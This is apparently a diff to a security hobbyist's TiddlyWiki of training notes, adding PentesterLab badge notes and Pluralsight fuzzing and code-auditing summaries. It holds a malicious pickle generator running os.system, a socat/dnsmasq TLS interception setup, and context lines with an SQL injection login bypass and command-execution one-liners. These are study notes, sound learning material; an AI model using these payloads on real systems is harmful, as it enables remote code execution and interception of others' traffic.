@@ -234,6 +234,8 @@ Error message and password prompt
 
 <li>PentesterLab Notes - Essential Badge</li>
 
+<li>PentesterLab Notes - Intercept Badge</li>
+
 <li>PentesterLab Notes - PCAP Badge</li>
 
 <li>PentesterLab Notes - Unix Badge</li>
@@ -241,6 +243,16 @@ Error message and password prompt
 <li>PentesterLab Notes - White Badge</li>
 
 <li>Programming notes</li>
+
+<li>Security for Hackers and Developers Notes</li>
+
+<li>Security for Hackers and Developers: Code Auditing</li>
+
+<li>Security for Hackers and Developers: Fuzzing</li>
+
+<li>Security for Hackers and Developers: Overview</li>
+
+<li>Security for Hackers and Developers: Reverse Engineering</li>
 
 <li>Ubuntu docker container with web shell</li>
 
@@ -8625,7 +8637,7 @@ Tool: Bytecode viewer by Konloch, javap (disassembler), javac (compiler).</pre>
 <div created="20180424234616405" modified="20180517191701014" title="$:/state/tab/sidebar--1835078512">
 <pre>$:/core/ui/SideBar/Recent</pre>
 </div>
-<div list="[[PentesterLab Notes - PCAP Badge]]" title="$:/StoryList">
+<div list="[[Security for Hackers and Developers: Reverse Engineering]]" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -9147,7 +9159,7 @@ Heap manager manages small allocations 8 bytes minimum
 
 Default Process heap is always created when process is created. GetProcessHeap returns handle to this heap. HeapCreate can create more heap. Heap size can be fixed or grow. Default is growable. Low Fragmentation Heap (LFH) deals with memory fragmentation issues.</pre>
 </div>
-<div created="20180424234251670" modified="20180730180344575" tags="" title="About">
+<div created="20180424234251670" modified="20180802192256510" tags="" title="About">
 <pre>This page contains random notes.
 Blog: &lt;a href=&quot;http://boredhackerblog.info&quot;&gt;http://boredhackerblog.info&lt;/a&gt;
 
@@ -9173,7 +9185,9 @@ Notes:
 
 [[VulnHub Notes]]
 
-[[OSCP Notes]]</pre>
+[[OSCP Notes]]
+
+[[Security for Hackers and Developers Notes]]</pre>
 </div>
 <div created="20180624224949924" modified="20180624225133392" title="Binary Exploitation Notes">
 <pre>Notes for RPI Modern Binary Exploitation course (https://github.com/RPISEC/MBE), Hacking, 2nd Edition book, and Shellcoders handbook.
@@ -10786,7 +10800,7 @@ enum4linux -v IP
 nmap --script smb-enum-users, smb-check-vulns
 ```</pre>
 </div>
-<div created="20180520170028027" modified="20180731184304119" title="PentesterLab Notes">
+<div created="20180520170028027" modified="20180802152725897" title="PentesterLab Notes">
 <pre>I've had PentesterLab Pro access for a while (1+ years) and I'm finally going through the modules. Taking notes because they may be useful to me or someone else.
 
 No write-ups are allowed for some of the exercises. I'll be posting resources in those cases.
@@ -10799,7 +10813,9 @@ Here's a referral link if you want to sign up for PentesterLab:  https://pentest
 
 [[PentesterLab Notes - White Badge]]
 
-[[PentesterLab Notes - PCAP Badge]]</pre>
+[[PentesterLab Notes - PCAP Badge]]
+
+[[PentesterLab Notes - Intercept Badge]]</pre>
 </div>
 <div created="20180520165112246" modified="20180731183728477" tags="" title="PentesterLab Notes - Essential Badge">
 <pre>There isn't much to note here since most of the exercise involve messing with HTTP requests and parameters. 
@@ -10918,6 +10934,47 @@ un/pw: ' OR 1=1 #
 
 ```</pre>
 </div>
+<div created="20180802152824018" modified="20180802172022945" title="PentesterLab Notes - Intercept Badge">
+<pre>Simple dnsmasq setup:
+
+```
+dnsmasq.conf
+addn-hosts=dnsmasq.hosts
+
+dnsmasq.hosts
+IP DOMAIN
+
+running: dnsmasq -C dnsmasq.conf --no-daemon
+```
+
+monitoring dns traffic
+
+```
+tcpdump udp port 53
+```
+
+certificate creation
+
+```
+openssl genra -out mycert.key 1024
+
+openssl req -new -key mycert.key -x509 -sha256 -days 3653 -out mycert.crt
+
+cat mycert.key mycert.crt &gt;mycert.pem
+```
+
+intercepting
+
+```
+request content:
+socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
+
+forwarding:
+socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
+```
+
+</pre>
+</div>
 <div created="20180731184308977" modified="20180731190637900" title="PentesterLab Notes - PCAP Badge">
 <pre>Included basic pcap analysis.
 
@@ -11008,8 +11065,23 @@ executing commands with ruby: /usr/bin/ruby -e 'require &quot;irb&quot; ; IRB.st
 
 executing commands using node: /usr/local/bin/node -e &quot;var exec = require('child_process').exec; exec('COMMAND', function (error, stdOut, stdErr) {console.log(stdOut);});&quot;</pre>
 </div>
-<div created="20180520165327363" modified="20180520165918871" tags="" title="PentesterLab Notes - White Badge">
-<pre></pre>
+<div created="20180520165327363" modified="20180802184450420" tags="" title="PentesterLab Notes - White Badge">
+<pre>If base64 decode results in a string with multiple lines and includes p1,p2,etc.., it might be pickle object.
+
+generating malicious pickle object
+
+```
+import cPickle
+import os
+
+class Blah(object):
+  def __reduce__(self):
+    return (os.system,(&quot;/bin/bash whatever...&quot;,))
+
+print cPickle.dumps(Blah())
+```
+
+</pre>
 </div>
 <div created="20180528171639192" modified="20180529153702785" tags="" title="Programming notes">
 <pre>Notes for programming or scripting
@@ -11023,6 +11095,100 @@ executing commands using node: /usr/local/bin/node -e &quot;var exec = require('
 [[Go Programming notes - 4]]
 
 [[Chrome Extension development]]</pre>
+</div>
+<div created="20180802192302525" modified="20180803004557786" title="Security for Hackers and Developers Notes">
+<pre>Going through 
+Security for Hackers and Developers Path on Pluralsight (https://www.pluralsight.com/paths/security-for-hackers-and-developers) before I do Application Security: For Hackers and Developers training at Derbycon.
+
+[[Security for Hackers and Developers: Overview]]
+
+[[Security for Hackers and Developers: Code Auditing]]
+
+[[Security for Hackers and Developers: Fuzzing]]
+
+[[Security for Hackers and Developers: Reverse Engineering]]</pre>
+</div>
+<div created="20180802195637367" modified="20180802221525571" title="Security for Hackers and Developers: Code Auditing">
+<pre>Some vulns: overflow, off-by-one, format string, integer error. switch case should have default, if none of the cases end up matching. command line injection, sql injection. use correct function based on string type (windows has ascii/wide). 
+
+Check to see math is correct when working with different types and pointers.
+
+Try not to ignore compiler errors...
+
+VLA - variable length array. 
+
+(there isn't a lot here. i'll take more notes during fuzzing and exploitation)</pre>
+</div>
+<div created="20180802222227430" modified="20180803004417660" title="Security for Hackers and Developers: Fuzzing">
+<pre>fuzzing - automated testing technique. done during run time. focuses on the attack surface.
+
+fuzzing types: mutation and generation, or dumb and intelligent. 
+
+ID target -&gt; Create fuzzer -&gt; Run fuzzer -&gt; analyze bugs -&gt; fix or exploit
+
+fuzzer needs to generate data, send data to the attack surface. a debugger or something needs to monitor the target. there should be recording of input and what happened because of the input. This will allow reproducing and finding root cause. 
+
+mutation fuzzing: valid input -&gt; mutate something. minimum set (minset): set of files that give most code coverage. 
+
+generation fuzzing: there is a data model. data structure of the input is known. specific things are fuzzed/mutated. 
+
+TLV - type length variable. 
+
+monitoring: attach process with debugger, fuzz, wait for crash. 
+
+Use a wrapper program, run fuzzer, wrapper app monitors for crashes. 
+
+pydbg: WIndows python library. Can attach to process, when process is crashed, context dumb can occur. 
+
+generation fuzzing: protocol knowledge is required. 
+
+Tools: SPIKE, Sulley, Peach community. 
+
+Peach fuzzer: Peach Community - free version.
+
+Peach Pit - XML file. 
+
+Peach Verifier - Will check Pit and actual file to see if data parsing is working correctly or not.
+
+Distributed fuzzing: Peach community can do this.
+
+FOE - failure observation engine, by CERT.
+
+Tools: Fuzzpark, Cyberfuzz, KernelFuzzer, nightmare.
+
+Peach fuzzer can fuzz API.
+
+in-memory fuzzer: fuzzing using memory snapshot and restore. 
+
+immunity debugger: execute till usercode takes you back to binary being debugged and out of library code.
+
+pydbg can also help with in-memory fuzzing w/ snapshot and restore. 
+
+feedback fuzzing - relies on feedback and increases code coverage. this is to reduce useless inputs.
+
+concolic testing  - symbolic execution + constraint solving + dynamic testing = concolic.
+
+Tools: libfuzzer, AFL.
+</pre>
+</div>
+<div created="20180802194034058" modified="20180802195515666" title="Security for Hackers and Developers: Overview">
+<pre>SDL: Microsoft SDL, BSIMM.com, SAFECode.org
+
+Microsoft Secure Development Lifecycle: Training, Requirements, Design, Implementation, Verification, Release, Response. 
+
+BSIMM: Governance, Intelligence, SSDL Touchpoints, Deployment.
+
+Threat Modeling (Microsoft has a tool): Diagram, ID Threats, Mitigate, Validate. 
+
+Static analysis tools: CppCheck, Fortify. OWASP has a list as well.
+
+Code analysis techniques: Attack surface. Where does input come from?
+
+Read code from top down, look for vuln functions, look for comments (fix me), dangerous API usage, etc.
+</pre>
+</div>
+<div created="20180803004603810" modified="20180803005012918" title="Security for Hackers and Developers: Reverse Engineering">
+<pre></pre>
 </div>
 <div created="20180524153104674" modified="20180524153848299" tags="" title="Ubuntu docker container with web shell">
 <pre>This might be useful for CTF's. Dockerfile can be modified so additional tools are installed or additional files are added. 
